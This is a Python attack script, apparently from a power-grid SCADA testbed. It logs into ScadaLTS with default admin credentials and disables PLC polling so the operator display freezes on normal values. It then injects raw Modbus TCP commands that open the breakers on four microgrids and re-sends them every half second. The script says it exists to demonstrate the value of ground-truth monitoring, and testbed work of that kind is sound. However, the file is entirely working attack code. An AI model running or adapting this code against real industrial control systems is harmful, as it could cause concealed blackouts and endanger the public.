#!/usr/bin/env python3
"""
Man-in-the-Middle Attack: Stealth Breaker Manipulation
======================================================
Two-pronged stealth attack that opens breakers while hiding from SCADA/UI:

  1. BLIND SCADA: Disable PLC data source polling on ScadaLTS so it freezes
     on the last known "good" values (breakers closed, voltage normal)
  2. INJECT: Send raw Modbus TCP commands directly to PLCs to open breakers

Result:
  - SCADA View (port 8888): Shows NORMAL (frozen stale data -- breakers "closed")
  - God's View  (port 8889): Shows ATTACK (real-time ground truth -- breakers OPEN)

This demonstrates why ground truth monitoring (God's View) is essential --
the SCADA operator sees nothing wrong while the grid is blacked out.

Usage:
    # Read current state only (data-source status + breaker states)
    python attacks/scada_mitm_attack.py --recon

    # Full stealth attack on all microgrids
    python attacks/scada_mitm_attack.py --all

    # Attack then auto-reveal after N seconds (demo mode)
    python attacks/scada_mitm_attack.py --all --reveal 60

    # Restore after attack (see recovery script)
    python attacks/scada_mitm_recovery.py --restore

MITRE ATT&CK ICS:
    T0830 - Man in the Middle
    T0856 - Spoof Reporting Message
    T0806 - Brute Force I/O
    T0831 - Manipulation of Control
"""

import argparse
import os
import socket
import struct
import sys
import time
import requests

# Default env file location: prod.env sits one directory above this script
# on deployed VMs (e.g., /opt/powergrid/prod.env, with scripts in /opt/powergrid/attacks/).
DEFAULT_ENV_FILE = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), '..', 'prod.env'
)


# =============================================================================
# Modbus TCP constants (from modbus_packet_injection.py)
# =============================================================================
FC_READ_COILS = 0x01
FC_WRITE_SINGLE_COIL = 0x05
COIL_ON = 0xFF00
COIL_OFF = 0x0000
MODBUS_UNIT_ID = 1

# PLC coil maps
LOAD_PLC_COILS = {
    'Market_Control': 3,
    'Main_Cmd_Input': 4,
    'Load_Cmd_Input': 5,
    'Bidder_Cmd_Input': 6,
}
GEN_PLC_COILS = {
    'Market_Control': 2,
    'Main_Cmd_Input': 3,
    'Gen_Cmd_Input': 4,
}

# PLC addresses (overridden by --env-file)
PLC_HOSTS = {'mg1': '127.0.0.1', 'mg2': '127.0.0.1', 'mg3': '127.0.0.1', 'mg4': '127.0.0.1'}
PLC_PORTS = {'mg1': 502, 'mg2': 503, 'mg3': 504, 'mg4': 505}

# SCADA Gateway Modbus (unit 10)
GATEWAY_HOST = '127.0.0.1'
GATEWAY_PORT = 5020
GATEWAY_UNIT_ID = 10
GATEWAY_OPERATOR_MODE_COIL = 12


# =============================================================================
# Raw Modbus TCP injection (stdlib only)
# =============================================================================
class ModbusInjector:
    """Minimal raw Modbus TCP client."""

    def __init__(self, host, port, verbose=False):
        self.host = host
        self.port = port
        
        self.sock = None
        self.txn_id = 0

    def connect(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(5.0)
            self.sock.connect((self.host, self.port))
            return True
        except socket.error as e:
            print(f"    [-] Connect {self.host}:{self.port} failed: {e}")
            return False

    def close(self):
        if self.sock:
            self.sock.close()
            self.sock = None

    def write_coil(self, address, value):
        self.txn_id = (self.txn_id + 1) % 65536
        coil_val = COIL_ON if value else COIL_OFF
        pdu = struct.pack('>BHH', FC_WRITE_SINGLE_COIL, address, coil_val)
        header = struct.pack('>HHHB', self.txn_id, 0, len(pdu) + 1, MODBUS_UNIT_ID)
        try:
            self.sock.send(header + pdu)
            resp = self.sock.recv(256)
            return resp and len(resp) >= 12 and not (resp[7] & 0x80)
        except socket.error:
            return False

    def read_coils(self, start, count):
        self.txn_id = (self.txn_id + 1) % 65536
        pdu = struct.pack('>BHH', FC_READ_COILS, start, count)
        header = struct.pack('>HHHB', self.txn_id, 0, len(pdu) + 1, MODBUS_UNIT_ID)
        try:
            self.sock.send(header + pdu)
            resp = self.sock.recv(256)
            if not resp or len(resp) < 10 or (resp[7] & 0x80):
                return None
            byte_count = resp[8]
            coil_bytes = resp[9:9 + byte_count]
            return [bool(coil_bytes[i // 8] & (1 << (i % 8))) for i in range(count)]
        except socket.error:
            return None


# =============================================================================
# ScadaLTS data source blinding
# =============================================================================
class ScadaBlinder:
    """Disable/enable ScadaLTS data source polling to blind the operator."""

    def __init__(self, scada_url, verbose=False):
        self.base = scada_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        })
        self.verbose = verbose
        self.jsession = ''
        self.ds_map = {}  # name -> {id, enabled}

    def log(self, msg):
        if self.verbose:
            print(f"  [*] {msg}")

    def login(self):
        try:
            self.session.get(f"{self.base}/login.htm", timeout=5)
            resp = self.session.post(
                f"{self.base}/login.htm",
                data={"username": "admin", "password": "admin"},
                timeout=5, allow_redirects=True,
            )
            if "logout" in resp.text.lower() or "watch_list" in resp.url.lower():
                self.session.get(f"{self.base}/watch_list.shtm", timeout=5)
                self.jsession = self.session.cookies.get('JSESSIONID', '')
                return True
        except requests.RequestException:
            pass
        return False

    def discover_datasources(self):
        """Get all data sources and their IDs."""
        try:
            resp = self.session.get(
                f"{self.base}/api/datasource/getAll", timeout=5)
            if resp.status_code == 200:
                for ds in resp.json():
                    self.ds_map[ds['name']] = {
                        'id': ds['id'],
                        'enabled': ds.get('enabled', True),
                    }
                return True
        except Exception:
            pass
        return False

    def toggle_datasource(self, ds_id):
        """Toggle data source enabled/disabled via DWR."""
        dwr_data = (
            f"callCount=1\n"
            f"page=/Scada-LTS/data_sources.shtm\n"
            f"httpSessionId={self.jsession}\n"
            f"scriptSessionId=\n"
            f"c0-scriptName=DataSourceListDwr\n"
            f"c0-methodName=toggleDataSource\n"
            f"c0-id=0\n"
            f"c0-param0=number:{ds_id}\n"
            f"batchId=1\n"
        )
        try:
            resp = self.session.post(
                f"{self.base}/dwr/call/plaincall/DataSourceListDwr.toggleDataSource.dwr",
                data=dwr_data,
                headers={'Content-Type': 'text/plain'},
                timeout=10,
            )
            return 'remoteHandleCallback' in resp.text
        except Exception:
            return False

    def disable_plc_datasources(self, targets):
        """Disable PLC data sources to freeze SCADA on last known values."""
        disabled = []
        for mg_id in targets:
            ds_name = f"{mg_id.upper()}_PLC"
            ds = self.ds_map.get(ds_name)
            if not ds:
                print(f"    [SKIP] Data source '{ds_name}' not found")
                continue
            if not ds['enabled']:
                print(f"    [OK] {ds_name} (id={ds['id']}) already disabled")
                disabled.append(mg_id)
                continue
            ok = self.toggle_datasource(ds['id'])
            status = "OK" if ok else "FAIL"
            print(f"    [{status}] {ds_name} (id={ds['id']}) -> DISABLED")
            if ok:
                disabled.append(mg_id)
            time.sleep(0.3)
        return disabled

    def enable_plc_datasources(self, targets):
        """Re-enable PLC data sources (uncloak -- SCADA discovers real state)."""
        for mg_id in targets:
            ds_name = f"{mg_id.upper()}_PLC"
            ds = self.ds_map.get(ds_name)
            if not ds:
                continue
            ok = self.toggle_datasource(ds['id'])
            status = "OK" if ok else "FAIL"
            print(f"    [{status}] {ds_name} (id={ds['id']}) -> ENABLED")
            time.sleep(0.3)

    def read_point(self, xid):
        try:
            resp = self.session.get(
                f"{self.base}/api/point_value/getValue/{xid}", timeout=5)
            if resp.status_code == 200:
                return resp.json().get('value')
        except Exception:
            pass
        return None


def set_operator_mode_raw(value, verbose=False):
    """Set Operator Mode on SCADA Gateway via raw Modbus (port 5020, unit 10)."""
    injector = ModbusInjector(GATEWAY_HOST, GATEWAY_PORT, verbose)
    # Override unit ID for gateway
    try:
        injector.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        injector.sock.settimeout(5.0)
        injector.sock.connect((GATEWAY_HOST, GATEWAY_PORT))
    except socket.error as e:
        print(f"    [-] Gateway connect failed: {e}")
        return False

    try:
        # Build frame with unit_id=10
        injector.txn_id = (injector.txn_id + 1) % 65536
        coil_val = COIL_ON if value else COIL_OFF
        pdu = struct.pack('>BHH', FC_WRITE_SINGLE_COIL, GATEWAY_OPERATOR_MODE_COIL, coil_val)
        header = struct.pack('>HHHB', injector.txn_id, 0, len(pdu) + 1, GATEWAY_UNIT_ID)
        injector.sock.send(header + pdu)
        resp = injector.sock.recv(256)
        ok = resp and len(resp) >= 12 and not (resp[7] & 0x80)
        return ok
    except socket.error:
        return False
    finally:
        injector.close()


def inject_breaker_attack(targets, verbose=False):
    """Open all breakers on target PLCs via raw Modbus."""
    results = {}
    for mg_id in targets:
        port = PLC_PORTS[mg_id]
        coils = GEN_PLC_COILS if mg_id == 'mg4' else LOAD_PLC_COILS

        injector = ModbusInjector(PLC_HOSTS[mg_id], port, verbose)
        if not injector.connect():
            results[mg_id] = False
            continue

        try:
            # Enable Market Control
            injector.write_coil(coils['Market_Control'], True)
            time.sleep(0.1)

            # Open all breakers
            for name, addr in coils.items():
                if name == 'Market_Control':
                    continue
                injector.write_coil(addr, False)
                time.sleep(0.05)

            time.sleep(0.3)

            # Verify
            num_coils = 5 if mg_id == 'mg4' else 7
            coil_states = injector.read_coils(0, num_coils)
            if coil_states:
                breaker = coil_states[0]  # Main_Breaker_Closed
                override = coil_states[coils['Market_Control']]
                ok = (not breaker) and override
                results[mg_id] = ok
                status = "OPEN" if not breaker else "closed"
                print(f"    [{mg_id.upper()}] Main_Breaker={status}, Override={override}")
            else:
                results[mg_id] = True  # commands sent

        except Exception as e:
            print(f"    [{mg_id.upper()}] Error: {e}")
            results[mg_id] = False
        finally:
            injector.close()

    return results


def run_recon(scada_url, targets, verbose=False):
    """Read-only: SCADA data-source status (blinded?) + ground-truth breaker states."""
    print("[+] SCADA data source status (is SCADA blinded?):")
    blinder = ScadaBlinder(scada_url, verbose=verbose)
    if blinder.login() and blinder.discover_datasources():
        for mg_id in targets:
            ds = blinder.ds_map.get(f"{mg_id.upper()}_PLC")
            if ds:
                state = "enabled (polling)" if ds['enabled'] else "DISABLED (blinded)"
                print(f"    {mg_id.upper()}_PLC (id={ds['id']}): {state}")
            else:
                print(f"    {mg_id.upper()}_PLC: not found")
    else:
        print("    [-] Could not query ScadaLTS data sources")
    print()

    print("[+] Ground-truth PLC breaker states (direct Modbus):")
    for mg_id in targets:
        inj = ModbusInjector(PLC_HOSTS[mg_id], PLC_PORTS[mg_id], verbose)
        if not inj.connect():
            print(f"    {mg_id.upper()}: [UNREACHABLE] port {PLC_PORTS[mg_id]}")
            continue
        # Breaker-state coils start at address 0 (Closed=True).
        if mg_id == 'mg4':
            coils = inj.read_coils(0, 5)  # 0=Main 1=Gen_Online 2=Market_Control
            inj.close()
            if not coils:
                print(f"    {mg_id.upper()}: [read failed]")
                continue
            main = 'closed' if coils[0] else 'OPEN'
            gen = 'online' if coils[1] else 'OFFLINE'
            print(f"    {mg_id.upper()}: Main={main} Gen={gen} Market_Control={coils[2]}")
        else:
            coils = inj.read_coils(0, 7)  # 0=Main 1=Load 2=Bidder 3=Market_Control
            inj.close()
            if not coils:
                print(f"    {mg_id.upper()}: [read failed]")
                continue
            main = 'closed' if coils[0] else 'OPEN'
            load = 'closed' if coils[1] else 'OPEN'
            bidder = 'closed' if coils[2] else 'OPEN'
            print(f"    {mg_id.upper()}: Main={main} Load={load} Bidder={bidder} "
                  f"Market_Control={coils[3]}")
    print()


def main():
    parser = argparse.ArgumentParser(
        description="MITM Stealth Attack: Open breakers while blinding SCADA",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    # Read current state only (recon)
    python attacks/scada_mitm_attack.py --recon

    # Full stealth attack on all microgrids
    python attacks/scada_mitm_attack.py --all

    # Attack then auto-reveal after 60 seconds
    python attacks/scada_mitm_attack.py --all --reveal 60

    # Restore after attack (see recovery script)
    python attacks/scada_mitm_recovery.py --restore
        """
    )
    parser.add_argument('--all', action='store_true',
                        help='Attack all microgrids (blind SCADA + open breakers)')
    parser.add_argument('--recon', action='store_true',
                        help='Read current state only (data-source status + breaker states)')
    parser.add_argument('--reveal', type=int, default=0,
                        help='Auto-reveal after N seconds (re-enable SCADA polling)')
    parser.add_argument('--scada-url', default='http://localhost:8080/Scada-LTS',
                        help='ScadaLTS base URL')
    parser.add_argument('--env-file', default=DEFAULT_ENV_FILE,
                        help=f'Load service addresses from env file (default: {DEFAULT_ENV_FILE})')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Verbose output')

    args = parser.parse_args()

    # Override defaults from env file (explicit CLI args take priority).
    # Silently skip if the default path doesn't exist (e.g., running from dev tree).
    if args.env_file and os.path.isfile(args.env_file):
        from env_loader import load_env_file, resolve_addresses
        addrs = resolve_addresses(load_env_file(args.env_file))
        if args.scada_url == 'http://localhost:8080/Scada-LTS':
            args.scada_url = addrs['scada_url']
        for mg, (host, port) in addrs['plc_hosts'].items():
            PLC_HOSTS[mg] = host
            PLC_PORTS[mg] = port
        global GATEWAY_HOST
        GATEWAY_HOST = addrs['gateway_host']

    if not args.all and not args.recon:
        parser.print_help()
        sys.exit(1)

    targets = ['mg1', 'mg2', 'mg3', 'mg4']

    print("=" * 60)
    print("  MITM Stealth Attack: Blind SCADA + Inject Breaker Commands")
    print("=" * 60)
    print(f"  Mode: {'Recon' if args.recon else 'Stealth Attack'}")
    print(f"  Targets: {', '.join(t.upper() for t in targets)}")
    if args.reveal:
        print(f"  Auto-reveal: {args.reveal}s")
    print()

    # Recon mode: read-only, no changes
    if args.recon:
        run_recon(args.scada_url, targets, verbose=args.verbose)
        sys.exit(0)

    # Phase 1: Login to ScadaLTS
    print("[+] Phase 1: Authenticating to ScadaLTS...")
    blinder = ScadaBlinder(args.scada_url, verbose=args.verbose)
    if not blinder.login():
        print("    [-] Authentication failed")
        sys.exit(1)
    print("    [OK] Authenticated as admin")

    # Discover data sources
    print()
    print("[+] Phase 2: Discovering SCADA data sources...")
    if not blinder.discover_datasources():
        print("    [-] Failed to enumerate data sources")
        sys.exit(1)
    for name, info in blinder.ds_map.items():
        state = "enabled" if info['enabled'] else "DISABLED"
        print(f"    {name} (id={info['id']}) [{state}]")

    # Phase 3: Blind SCADA (disable PLC data source polling)
    print()
    print("[+] Phase 3: Blinding SCADA (disabling PLC data source polling)...")
    print("    SCADA will freeze on last known 'good' values")
    disabled = blinder.disable_plc_datasources(targets)
    time.sleep(1)

    if not disabled:
        print("    [-] Failed to disable any data sources")
        sys.exit(1)

    # Phase 4: Raw Modbus injection to PLCs (initial)
    print()
    print("[+] Phase 4: Injecting raw Modbus commands to PLCs...")
    print("    Bypassing SCADA -- direct to PLC Modbus ports")
    results = inject_breaker_attack(disabled, verbose=args.verbose)

    # Phase 5: Verify stealth
    print()
    print("[+] Phase 5: Verifying stealth...")
    print()

    # Check SCADA still shows "normal" (frozen stale values)
    scada_sees_attack = False
    for mg_id in disabled:
        xid = f"DP_{mg_id.upper()}_PLC_Main_Breaker_Closed"
        val = blinder.read_point(xid)
        scada_status = "closed (STALE)" if val == 'true' else f"{val} (DETECTED!)"
        if val != 'true':
            scada_sees_attack = True
        print(f"    SCADA View  {mg_id.upper()}: Main_Breaker = {scada_status}")

    print()
    if scada_sees_attack:
        print("  WARNING: SCADA may have detected the attack (poll race)")
    else:
        print("  STEALTH OK: SCADA shows normal (frozen stale data)")
        print("  God's View shows real state: breakers OPEN")

    print()
    print("  Compare:")
    print("    SCADA View  -> http://localhost:8888  (shows NORMAL -- blind)")
    print("    God's View  -> http://localhost:8889  (shows ATTACK -- real)")

    # Phase 6: Continuous injection loop
    # Gateway overwrites Cmd_Input every ~1s, so we must re-inject continuously
    duration = args.reveal if args.reveal > 0 else None
    if duration:
        print()
        print(f"[+] Phase 6: Continuous injection for {duration}s (Ctrl+C to stop)...")
    else:
        print()
        print("[+] Phase 6: Continuous injection until Ctrl+C...")

    inject_interval = 0.5  # re-inject every 500ms to beat gateway's 1s cycle
    start_time = time.time()
    inject_count = 0

    try:
        while True:
            # Check duration
            elapsed = time.time() - start_time
            if duration and elapsed >= duration:
                break

            # Re-inject malicious commands to all target PLCs
            for mg_id in disabled:
                port = PLC_PORTS[mg_id]
                coils = GEN_PLC_COILS if mg_id == 'mg4' else LOAD_PLC_COILS
                try:
                    inj = ModbusInjector(PLC_HOSTS[mg_id], port)
                    if inj.connect():
                        inj.write_coil(coils['Market_Control'], True)
                        for name, addr in coils.items():
                            if name != 'Market_Control':
                                inj.write_coil(addr, False)
                        inj.close()
                except Exception:
                    pass

            inject_count += 1
            if inject_count % 20 == 0:  # status every 10s
                ts = time.strftime('%H:%M:%S')
                remaining = f", {int(duration - elapsed)}s left" if duration else ""
                print(f"    [{ts}] Injected {inject_count} cycles{remaining}", flush=True)

            time.sleep(inject_interval)

    except KeyboardInterrupt:
        print()
        print("  Injection stopped by user")

    print()
    print(f"  Total injection cycles: {inject_count}")

    # Uncloak
    if duration:
        print()
        print("[+] Uncloaking: Re-enabling PLC data source polling...")
        blinder.enable_plc_datasources(disabled)
        print()
        print("  SCADA now sees the real state -- attack revealed!")

    print()
    print("=" * 60)
    if duration:
        print("  Attack complete (revealed after uncloak)")
    else:
        print("  Attack stopped -- to restore SCADA polling:")
        print("    python attacks/scada_mitm_recovery.py --restore")
    print("=" * 60)


if __name__ == '__main__':
    main()
